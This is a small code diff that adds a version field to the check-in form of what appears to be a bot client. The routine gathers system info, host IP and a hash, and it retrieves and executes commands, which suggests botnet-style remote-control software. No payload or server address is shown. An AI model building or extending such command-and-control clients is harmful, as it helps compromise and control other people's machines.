@@ -121,6 +121,7 @@ void Bot::executeOrder() {
     // Retrieve commands to run and execute
     _prepareSysInfo();
     request::PostForm postForm;
+    postForm.addField("version", AURA_VERSION);
     postForm.addField("hash_sum", _hashSum);
     postForm.addField("ip_addr", _ipAddr);
 
